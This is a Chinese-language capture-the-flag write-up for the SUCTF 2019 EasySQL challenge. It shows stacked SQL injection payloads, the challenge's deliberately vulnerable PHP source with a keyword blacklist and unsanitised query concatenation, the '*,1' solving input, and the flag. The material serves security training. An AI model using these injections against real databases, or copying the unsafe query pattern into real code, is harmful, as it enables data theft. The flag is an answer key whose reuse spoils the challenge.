# [[SUCTF 2019]EasySQL](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)



## 0x00判断注入点



输入1，提交



结果为



```sql
Array ( [0] => 1 )
```



输入1'or' 1=1 ,提交



结果为



```sql
Nonono.
```



## 0x01使用堆叠注入



查看数据库：



```sql
1; show dababases;
```



结果为



```sql
Array ( [0] => 1 )
Array ( [0] => ctf ) 
Array ( [0] => ctftraining ) 
Array ( [0] => information_schema ) 
Array ( [0] => mysql ) 
Array ( [0] => performance_schema ) 
Array ( [0] => test )
```



没发现flag，继续查看表



```sql
1; show tables;
```



结果为



```sql
Array ( [0] => 1 ) 
Array ( [0] => Flag )
```



## 0x02找到flag表，查看flag表中字段



```sql
1; show columns from Flag;
```



结果为



```sql
Nonono.
```



发现flag显示不出来



## 0x03查看源码



源码



```php
&lt;?php
    session_start();

    include_once "config.php";

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=&gt;$v){
        if(!empty($v)&amp;&amp;is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=&gt;$v){
        }
    }
    //die();
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
&lt;form action="" method="post"&gt;
&lt;input type="text" name="query"&gt;
&lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])&gt;40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

?&gt;

```



通过源码发现内置的sql语句为



``` php
$sql = "select ".$post['query']."||flag from Flag";
```



## 0x04输入*,1



**如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容**



flag为



```sql
Array ( [0] => flag{04f36426-1560-4b91-9b0a-c8a6a4aa32d6} [1] => 1 )
```



## 0x05第二种方法



[**设置sql_mode为PIPES_AS_CONCAT**](https://www.cnblogs.com/gtx690/p/13176458.html)



当设置sql_mode为PIPES_AS_CONCAT时，将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似



作者

SihUi
